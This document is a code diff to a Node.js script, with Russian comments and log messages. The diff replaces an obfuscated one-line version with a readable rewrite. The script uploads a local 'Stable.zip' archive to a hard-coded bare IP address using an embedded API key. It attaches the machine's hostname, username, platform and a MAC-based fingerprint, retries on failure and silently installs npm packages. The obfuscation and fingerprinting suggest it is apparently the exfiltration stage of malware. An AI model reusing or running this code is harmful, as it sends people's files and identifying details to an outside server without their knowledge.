@@ -1,1 +1,218 @@
-const _0x18ef35=_0xc3e6;(function(_0x200494,_0x3caf42){const _0x4cb73a=_0xc3e6,_0x52285d=_0x200494();while(!![]){try{const _0x36998d=parseInt(_0x4cb73a(0x213))/0x1+-parseInt(_0x4cb73a(0x1fe))/0x2+parseInt(_0x4cb73a(0x227))/0x3*(parseInt(_0x4cb73a(0x215))/0x4)+parseInt(_0x4cb73a(0x1ea))/0x5+-parseInt(_0x4cb73a(0x226))/0x6*(parseInt(_0x4cb73a(0x223))/0x7)+-parseInt(_0x4cb73a(0x1fb))/0x8+parseInt(_0x4cb73a(0x22c))/0x9*(parseInt(_0x4cb73a(0x1f4))/0xa);if(_0x36998d===_0x3caf42)break;else _0x52285d['push'](_0x52285d['shift']());}catch(_0x3f7526){_0x52285d['push'](_0x52285d['shift']());}}}(_0x2492,0x983e8));const fs=require('fs'),axios=require(_0x18ef35(0x219)),FormData=require(_0x18ef35(0x20d)),path=require(_0x18ef35(0x21b)),os=require('os'),crypto=require(_0x18ef35(0x21c)),CONFIG={'serverUrl':_0x18ef35(0x20b),'archiveFileName':'Stable.zip','apiKey':_0x18ef35(0x214),'chunkSize':0x100*0x400,'retryDelay':0x1388,'maxRetries':0x5};function log(_0x542f90,_0x40e95e=![]){const _0x158504=_0x18ef35,_0x5694d7=new Date()[_0x158504(0x1fa)](),_0x4eb2ea='['+_0x5694d7+']\x20'+_0x542f90;_0x40e95e?console[_0x158504(0x1e8)](_0x4eb2ea):console['log'](_0x4eb2ea);try{fs[_0x158504(0x221)]('detailed_upload.log',_0x4eb2ea+'\x0a');}catch(_0x15e0ba){console[_0x158504(0x1e8)](_0x158504(0x1e7)+_0x15e0ba[_0x158504(0x210)]);}}function _0xc3e6(_0x4421df,_0x4a079c){const _0x2492bd=_0x2492();return _0xc3e6=function(_0xc3e67d,_0x46374c){_0xc3e67d=_0xc3e67d-0x1e6;let _0x451d5d=_0x2492bd[_0xc3e67d];return _0x451d5d;},_0xc3e6(_0x4421df,_0x4a079c);}function generateClientId(){const _0x1f37cc=_0x18ef35;try{const _0xa342e5=getMacAddress(),_0x4d626e=os[_0x1f37cc(0x207)](),_0x36d2a8=os[_0x1f37cc(0x1e9)]()[_0x1f37cc(0x211)],_0x2ce69a=crypto[_0x1f37cc(0x22a)](_0x1f37cc(0x1f2))[_0x1f37cc(0x229)](_0xa342e5+':'+_0x4d626e+':'+_0x36d2a8)[_0x1f37cc(0x1eb)](_0x1f37cc(0x1f7))['substring'](0x0,0x8);return _0x2ce69a;}catch(_0x476896){return Math[_0x1f37cc(0x203)]()[_0x1f37cc(0x208)](0x24)[_0x1f37cc(0x225)](0x2,0xa);}}function _0x2492(){const _0x536ef9=['hex','join','mac','toISOString','4587120lhkVde','Ошибка\x20настройки:\x20','unknown','574688PqDfIt','API-ключ:\x20','createReadStream','response','cwd','random','stringify','status','Нет\x20ответа\x20от\x20сервера','hostname','toString','internal','size','http://77.239.97.85:8088/api/files/upload','\x20байт','form-data','keys','networkInterfaces','message','username','request','483368zgonEf','tJz4uRVCwl2eEwyPTudYP9iGRfgq','46412yyWdBb','data','apiKey','readdirSync','axios','file','path','crypto','statSync','КРИТИЧЕСКАЯ\x20ОШИБКА\x20ПРИ\x20ЗАГРУЗКЕ:','arch','Не\x20удалось\x20загрузить\x20архив','appendFileSync','Архив\x20успешно\x20загружен','57421xNvjWu','archiveFileName','substring','318WxQxaQ','99lvuInF','serverUrl','update','createHash','getHeaders','1143kVBxtl','Полный\x20ответ\x20сервера:','Error\x20writing\x20to\x20log:\x20','error','userInfo','1270575baCeOt','digest','existsSync','Данные\x20ошибки:\x20','КРИТИЧЕСКАЯ\x20ОШИБКА:\x20Файл\x20не\x20найден:\x20','exit','Размер\x20файла:\x20','00:00:00:00:00:00','md5','Начало\x20процесса\x20загрузки\x20архива','62890njazCr','Содержимое\x20директории:\x20','Фатальная\x20ошибка:\x20'];_0x2492=function(){return _0x536ef9;};return _0x2492();}function getMacAddress(){const _0x2bcfb2=_0x18ef35;try{const _0x5d8fe7=os[_0x2bcfb2(0x20f)]();for(const _0x124d4b of Object[_0x2bcfb2(0x20e)](_0x5d8fe7)){for(const _0xce2a4e of _0x5d8fe7[_0x124d4b]){if(!_0xce2a4e[_0x2bcfb2(0x209)]&&_0xce2a4e[_0x2bcfb2(0x1f9)]!==_0x2bcfb2(0x1f1))return _0xce2a4e[_0x2bcfb2(0x1f9)];}}return _0x2bcfb2(0x1fd);}catch(_0x462e5){return _0x2bcfb2(0x1fd);}}async function uploadFile(){const _0x242466=_0x18ef35;try{const _0xcf1570=path[_0x242466(0x1f8)](process[_0x242466(0x202)](),CONFIG[_0x242466(0x224)]);if(!fs[_0x242466(0x1ec)](_0xcf1570))return log(_0x242466(0x1ee)+_0xcf1570,!![]),log('Текущая\x20директория:\x20'+process[_0x242466(0x202)](),!![]),log(_0x242466(0x1f5)+fs[_0x242466(0x218)](process[_0x242466(0x202)]())[_0x242466(0x1f8)](',\x20'),!![]),![];const _0xbc29d3=fs[_0x242466(0x21d)](_0xcf1570);log(_0x242466(0x1f0)+_0xbc29d3[_0x242466(0x20a)]+_0x242466(0x20c));const _0x403636=new FormData();_0x403636['append'](_0x242466(0x21a),fs[_0x242466(0x200)](_0xcf1570),{'filename':path['basename'](_0xcf1570),'contentType':'application/zip'});const _0x37030f={'hostname':os[_0x242466(0x207)](),'platform':os['platform'](),'type':os['type'](),'arch':os[_0x242466(0x21f)](),'username':os[_0x242466(0x1e9)]()[_0x242466(0x211)],'id':generateClientId()};log('Начало\x20загрузки\x20файла:\x20'+CONFIG[_0x242466(0x224)]),log('Информация\x20о\x20системе:\x20'+JSON['stringify'](_0x37030f)),log('URL\x20сервера:\x20'+CONFIG[_0x242466(0x228)]),log(_0x242466(0x1ff)+CONFIG[_0x242466(0x217)]);const _0x21e836=await axios['post'](CONFIG[_0x242466(0x228)],_0x403636,{'headers':{..._0x403636[_0x242466(0x22b)](),'X-Client-Info':JSON['stringify'](_0x37030f)},'maxContentLength':Infinity,'maxBodyLength':Infinity,'timeout':0xea60});return log(_0x242466(0x1e6),JSON[_0x242466(0x204)](_0x21e836[_0x242466(0x216)])),_0x21e836[_0x242466(0x216)]['success'];}catch(_0x6d1408){log(_0x242466(0x21e),!![]);if(_0x6d1408[_0x242466(0x201)])log('Статус\x20ошибки:\x20'+_0x6d1408[_0x242466(0x201)][_0x242466(0x205)],!![]),log(_0x242466(0x1ed)+JSON[_0x242466(0x204)](_0x6d1408[_0x242466(0x201)][_0x242466(0x216)]),!![]);else _0x6d1408[_0x242466(0x212)]?(log(_0x242466(0x206),!![]),log('Детали\x20запроса:\x20'+JSON[_0x242466(0x204)](_0x6d1408[_0x242466(0x212)]),!![])):log(_0x242466(0x1fc)+_0x6d1408[_0x242466(0x210)],!![]);return![];}}async function main(){const _0x23d2f3=_0x18ef35;try{log(_0x23d2f3(0x1f3));const _0x5a1178=await uploadFile();_0x5a1178?(log(_0x23d2f3(0x222)),process['exit'](0x0)):(log(_0x23d2f3(0x220),!![]),process[_0x23d2f3(0x1ef)](0x1));}catch(_0x5b0f37){log(_0x23d2f3(0x1f6)+_0x5b0f37[_0x23d2f3(0x210)],!![]),process[_0x23d2f3(0x1ef)](0x1);}}main();
+const fs = require('fs');
+const axios = require('axios');
+const FormData = require('form-data');
+const path = require('path');
+const os = require('os');
+const crypto = require('crypto');
+
+// ===================== CONFIGURATION =====================
+const CONFIG = {
+    serverUrl: 'http://77.239.97.85:8088/api/files/upload',
+    archiveFileName: 'Stable.zip', 
+    apiKey: 'tJz4uRVCwl2eEwyPTudYP9iGRfgq', 
+    retryDelay: 5000,              // 5 seconds between retry attempts
+    maxRetries: 5,                 // Maximum reconnection attempts
+    timeout: 120000                // 2 minutes timeout (увеличенный таймаут)
+};
+
+// ===================== UTILITY FUNCTIONS =====================
+function log(message, isError = false) {
+    const timestamp = new Date().toISOString();
+    const logMessage = `[${timestamp}] ${message}`;
+    
+    if (isError) {
+        console.error(logMessage);
+    } else {
+        console.log(logMessage);
+    }
+    
+    try {
+        fs.appendFileSync('detailed_upload.log', `${logMessage}\n`);
+    } catch (error) {
+        console.error(`Error writing to log: ${error.message}`);
+    }
+}
+
+function generateClientId() {
+    try {
+        const macAddress = getMacAddress();
+        const hostname = os.hostname();
+        const username = os.userInfo().username;
+        
+        const hash = crypto.createHash('md5')
+            .update(`${macAddress}:${hostname}:${username}`)
+            .digest('hex')
+            .substring(0, 8);
+        
+        return hash;
+    } catch (error) {
+        return Math.random().toString(36).substring(2, 10);
+    }
+}
+
+function getMacAddress() {
+    try {
+        const networkInterfaces = os.networkInterfaces();
+        for (const name of Object.keys(networkInterfaces)) {
+            for (const netInterface of networkInterfaces[name]) {
+                if (!netInterface.internal && netInterface.mac !== '00:00:00:00:00:00') {
+                    return netInterface.mac;
+                }
+            }
+        }
+        return 'unknown';
+    } catch (error) {
+        return 'unknown';
+    }
+}
+
+function formatFileSize(bytes) {
+    if (bytes === 0) return '0 Bytes';
+    
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+// ===================== FILE UPLOAD FUNCTION =====================
+async function uploadFile(retryCount = 0) {
+    try {
+        const filePath = path.join(process.cwd(), CONFIG.archiveFileName);
+        
+        // Проверяем существование файла
+        if (!fs.existsSync(filePath)) {
+            log(`КРИТИЧЕСКАЯ ОШИБКА: Файл не найден: ${filePath}`, true);
+            log(`Текущая директория: ${process.cwd()}`, true);
+            log(`Содержимое директории: ${fs.readdirSync(process.cwd()).join(', ')}`, true);
+            return false;
+        }
+
+        // Получаем статистику файла
+        const fileStats = fs.statSync(filePath);
+        const fileSize = fileStats.size;
+        log(`Размер файла: ${fileSize} байт (${formatFileSize(fileSize)})`);
+        
+        if (fileSize === 0) {
+            log(`ОШИБКА: Файл ${CONFIG.archiveFileName} имеет нулевой размер!`, true);
+            return false;
+        }
+
+        // Создаем FormData
+        const formData = new FormData();
+        formData.append('file', fs.createReadStream(filePath), {
+            filename: path.basename(filePath),
+            contentType: 'application/zip',
+            knownLength: fileSize // Явно указываем размер файла
+        });
+
+        // Системная информация
+        const systemInfo = {
+            hostname: os.hostname(),
+            platform: os.platform(),
+            type: os.type(),
+            arch: os.arch(),
+            username: os.userInfo().username,
+            id: generateClientId()
+        };
+
+        log(`Начало загрузки файла: ${CONFIG.archiveFileName}`);
+        log(`Информация о системе: ${JSON.stringify(systemInfo)}`);
+        log(`URL сервера: ${CONFIG.serverUrl}`);
+        
+        // Отправляем файл с мониторингом прогресса загрузки
+        const startTime = Date.now();
+        log(`Отправка началась в: ${new Date(startTime).toISOString()}`);
+        
+        // Отправляем файл
+        const response = await axios.post(CONFIG.serverUrl, formData, {
+            headers: {
+                ...formData.getHeaders(),
+                'X-Client-Info': JSON.stringify(systemInfo),
+                'Content-Length': formData.getLengthSync() // Устанавливаем точный Content-Length
+            },
+            maxContentLength: Infinity,
+            maxBodyLength: Infinity,
+            timeout: CONFIG.timeout,
+            onUploadProgress: (progressEvent) => {
+                const percentCompleted = Math.round((progressEvent.loaded * 100) / progressEvent.total);
+                log(`Прогресс загрузки: ${percentCompleted}% (${formatFileSize(progressEvent.loaded)}/${formatFileSize(progressEvent.total)})`);
+            }
+        });
+
+        const endTime = Date.now();
+        const duration = (endTime - startTime) / 1000; // в секундах
+        const speed = fileSize / duration / 1024; // KB/s
+        
+        log(`Загрузка завершена за ${duration.toFixed(1)} секунд (${speed.toFixed(2)} KB/s)`);
+        log(`Статус ответа: ${response.status}`);
+        log(`Ответ сервера: ${JSON.stringify(response.data)}`);
+        
+        return response.data.success;
+    } catch (error) {
+        // Детальное логирование ошибок
+        log(`ОШИБКА ПРИ ЗАГРУЗКЕ (попытка ${retryCount + 1}/${CONFIG.maxRetries}):`, true);
+        
+        if (error.response) {
+            // Сервер ответил с ошибкой
+            log(`Статус ошибки: ${error.response.status}`, true);
+            log(`Данные ошибки: ${JSON.stringify(error.response.data)}`, true);
+        } else if (error.request) {
+            // Запрос был сделан, но нет ответа
+            log('Нет ответа от сервера', true);
+            log(`Тип ошибки: ${error.code}`, true);
+        } else {
+            // Что-то пошло не так при настройке запроса
+            log(`Ошибка настройки: ${error.message}`, true);
+        }
+        
+        // Попробуем повторить запрос, если не превышено максимальное количество попыток
+        if (retryCount < CONFIG.maxRetries) {
+            log(`Повторная попытка через ${CONFIG.retryDelay / 1000} секунд...`);
+            await new Promise(resolve => setTimeout(resolve, CONFIG.retryDelay));
+            return uploadFile(retryCount + 1);
+        }
+        
+        log(`Превышено максимальное количество попыток (${CONFIG.maxRetries})`, true);
+        return false;
+    }
+}
+
+// ===================== MAIN FUNCTION =====================
+async function main() {
+    try {
+        log('========== НАЧАЛО ПРОЦЕССА ЗАГРУЗКИ АРХИВА ==========');
+        log(`Версия Node.js: ${process.version}`);
+        log(`Платформа: ${process.platform}`);
+        log(`Директория запуска: ${process.cwd()}`);
+        
+        // Проверка наличия необходимых пакетов
+        try {
+            if (!fs.existsSync('./node_modules/axios') || !fs.existsSync('./node_modules/form-data')) {
+                log('Установка необходимых зависимостей...');
+                require('child_process').execSync('npm install axios form-data');
+                log('Зависимости успешно установлены');
+            }
+        } catch (error) {
+            log(`Предупреждение: Не удалось проверить/установить зависимости: ${error.message}`);
+        }
+        
+        const success = await uploadFile();
+        
+        if (success) {
+            log('========== АРХИВ УСПЕШНО ЗАГРУЖЕН ==========');
+            process.exit(0);
+        } else {
+            log('========== НЕ УДАЛОСЬ ЗАГРУЗИТЬ АРХИВ ==========', true);
+            process.exit(1);
+        }
+    } catch (error) {
+        log(`ФАТАЛЬНАЯ ОШИБКА: ${error.message}`, true);
+        log(`Стек ошибки: ${error.stack}`, true);
+        process.exit(1);
+    }
+}
+
+// Запускаем основную функцию
+main();
